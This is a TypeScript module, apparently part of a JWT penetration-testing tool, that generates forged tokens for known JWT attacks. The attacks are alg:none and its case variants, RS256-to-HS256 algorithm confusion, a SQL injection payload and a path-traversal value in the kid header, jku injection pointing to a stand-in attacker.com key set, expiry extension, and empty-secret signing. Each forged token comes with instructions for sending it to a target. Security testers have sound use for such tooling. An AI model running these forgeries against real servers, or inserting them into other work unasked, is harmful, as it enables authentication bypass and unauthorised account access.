import { JWTResult } from './jwt'

export type AttackVariant = {
  id: string
  name: string
  severity: 'critical' | 'high' | 'medium'
  description: string
  how_to_use: string
  token: string
  cve?: string
}

function base64url(obj: object): string {
  return btoa(JSON.stringify(obj))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '')
}

export function generateAttacks(result: JWTResult): AttackVariant[] {
  const { header, payload, raw } = result
  const attacks: AttackVariant[] = []

  
  const noneHeader = base64url({ ...header, alg: 'none' })
  const nonePayload = raw.payload
  attacks.push({
    id: 'alg-none',
    name: 'Algorithm None',
    severity: 'critical',
    cve: 'CVE-2015-9235',
    description: 'Sets alg to none and removes the signature. Vulnerable servers skip verification entirely.',
    how_to_use: 'Send this token to the target. If accepted, the server is critically vulnerable.',
    token: `${noneHeader}.${nonePayload}.`,
  })

  
  const noneVariants = ['None', 'NONE', 'nOnE']
  noneVariants.forEach((variant) => {
    const h = base64url({ ...header, alg: variant })
    attacks.push({
      id: `alg-none-${variant}`,
      name: `Algorithm None (${variant})`,
      severity: 'critical',
      cve: 'CVE-2015-9235',
      description: `Case variation of alg:none. Some libraries do case-sensitive checks and miss this.`,
      how_to_use: 'Try each variant if the lowercase none is rejected - some filters are case-sensitive.',
      token: `${h}.${nonePayload}.`,
    })
  })

  
  if (header.alg === 'RS256' || header.alg === 'ES256') {
    const confusionHeader = base64url({ ...header, alg: 'HS256' })
    attacks.push({
      id: 'alg-confusion',
      name: 'Algorithm Confusion (RS256 → HS256)',
      severity: 'critical',
      description: 'Switches to HS256. Sign with the server\'s public key as the HMAC secret. Server may verify using public key as secret.',
      how_to_use: 'Fetch the server\'s public key, use it as the HMAC secret to sign this token, then send it.',
      token: `${confusionHeader}.${nonePayload}.<sign_with_public_key_as_hmac_secret>`,
    })
  }

  
  const kidSQLHeader = base64url({ ...header, kid: "' OR '1'='1" })
  attacks.push({
    id: 'kid-sqli',
    name: 'kid SQL Injection',
    severity: 'high',
    description: 'Injects SQL into the kid header. If the server uses kid in a DB query unsanitized, this bypasses key lookup.',
    how_to_use: 'Send this token. If the server returns a 200, the kid is being used in an unsanitized SQL query.',
    token: `${kidSQLHeader}.${nonePayload}.${raw.signature}`,
  })

  
  const kidPathHeader = base64url({ ...header, kid: '../../../dev/null' })
  attacks.push({
    id: 'kid-traversal',
    name: 'kid Path Traversal',
    severity: 'high',
    description: 'Points kid to /dev/null (empty file). If server reads the key from filesystem using kid, it verifies against an empty secret.',
    how_to_use: 'If accepted, sign a new token with an empty string as the secret - the server will accept it.',
    token: `${kidPathHeader}.${nonePayload}.${raw.signature}`,
  })

  
  attacks.push({
    id: 'jku-injection',
    name: 'jku Header Injection',
    severity: 'critical',
    description: 'Adds a jku header pointing to an attacker-controlled JWKS. Server fetches keys from your URL instead of the real one.',
    how_to_use: 'Host a JWKS at your server, generate an RSA keypair, sign the token with your private key, put the public key in your JWKS.',
    token: `${base64url({ ...header, jku: 'https://attacker.com/jwks.json' })}.${nonePayload}.<sign_with_your_private_key>`,
  })

  
  if (payload.exp) {
    const newPayload = base64url({
      ...payload,
      exp: Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365 * 10,
    })
    attacks.push({
      id: 'exp-extended',
      name: 'Expiry Extension',
      severity: 'medium',
      description: 'Extends exp by 10 years. Tests if the server verifies expiry or blindly trusts the payload.',
      how_to_use: 'Send this token after the original expires. If accepted, the server is not validating exp.',
      token: `${raw.header}.${newPayload}.${raw.signature}`,
    })
  }

  
  attacks.push({
    id: 'empty-secret',
    name: 'Empty Secret',
    severity: 'high',
    description: 'Some misconfigured servers use an empty string as the HMAC secret.',
    how_to_use: 'Sign a new token with an empty string secret using HS256 and send it.',
    token: `${raw.header}.${nonePayload}.<sign_with_empty_string_secret>`,
  })

  return attacks
}